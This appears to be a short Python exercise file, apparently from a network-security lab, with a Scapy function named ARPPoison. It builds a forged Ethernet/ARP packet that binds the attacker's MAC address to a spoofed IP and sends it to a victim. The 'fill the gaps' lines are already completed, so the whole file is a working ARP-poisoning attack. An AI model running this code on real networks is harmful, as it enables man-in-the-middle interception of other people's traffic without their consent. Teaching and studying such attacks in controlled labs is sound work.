from scapy.all import *

def ARPPoison(macAttacker, macVictim, ipToSpoof, ipVictim):
    arp = Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker# fill the gaps
    arp[ARP].psrc = ipToSpoof   # fill the gaps
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim    # fill the gaps

    sendp(arp)